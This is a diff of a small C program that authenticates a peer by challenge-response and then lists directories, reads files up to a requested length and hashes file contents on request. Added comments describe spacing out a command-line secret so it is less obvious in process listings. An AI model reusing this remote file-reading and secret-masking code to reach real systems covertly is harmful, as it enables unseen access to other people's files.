@@ -48,7 +48,12 @@
 // ver 8
 // 23 path - statdata -- stat
 
-#define VERSION "8"
+// ver 9, TODO
+// 15 - paths* | "" -- getdents64
+// 17 x24 len32 - fnv32a -- fnv32a
+// 18 x24 len32 - filedata* | "" -- read file
+
+#define VERSION "9"
 
 #include <errno.h>
 #include <stdlib.h>
@@ -202,7 +207,9 @@ int main(int argc, char *argv[])
                 eargv[2] = argv[1];
                 execve(argv[0], eargv, environ);
         }
-
+        // copy id + challenge-response secret from commandline.
+        // also space out commandline secret, to be less obvious.
+        // some ps uinfortunately versions show the spaces.
         {
                 int i;
 
@@ -269,6 +276,7 @@ int main(int argc, char *argv[])
 
                                 sockopts(0);
 
+                                // se bm::tn for more readable challenge response protocol
                                 write(0, secret, 32 + 32);
                                 crypto_hash(buffer, secret, 32 + 32 + 32);
 
@@ -392,16 +400,15 @@ int main(int argc, char *argv[])
                                                           int l;
 
                                                           while ((l = syscall(SCN(SYS_getdents64), fh, buffer, sizeof (buffer))) > 0) {
-                                                                  uint8_t *buf = buffer;
+                                                                  uint8_t *cur = buffer;
+                                                                  uint8_t *end = buffer + l;
 
-                                                                  do {
-                                                                          int w = l > 254 ? 254 : l;
+                                                                  while (cur < end) {
+                                                                          struct linux_dirent64 *dent = (void *)cur;
 
-                                                                          wpkt(buf, w);
-                                                                          buf += w;
-                                                                          l -= w;
+                                                                          wpkt((void *)&dent->name, strlen(dent->name));
+                                                                          cur += dent->reclen;
                                                                   }
-                                                                  while (l);
                                                           }
 
                                                           wpkt(buffer, 0);
@@ -417,9 +424,12 @@ int main(int argc, char *argv[])
                                                   {
                                                           int fnv = buffer[0] == 17;
                                                           uint32_t hval = 2166136261U;
+                                                          uint32_t max = *(uint32_t *) (buffer + 4);
                                                           int l;
 
-                                                          while ((l = read(fh, buffer, 254)) > 0) {
+                                                          while ((l = read(fh, buffer, MIN(max, 254))) > 0) {
+                                                                  max -= l;
+
                                                                   if (fnv) {
                                                                           uint8_t *p = buffer;
 
@@ -429,6 +439,9 @@ int main(int argc, char *argv[])
                                                                           }
                                                                   } else
                                                                           wpkt(buffer, l);
+
+                                                                  if (!max)
+                                                                          break;
                                                           }
 
                                                           wpkt((uint8_t *) & hval, fnv ? sizeof (hval) : 0);
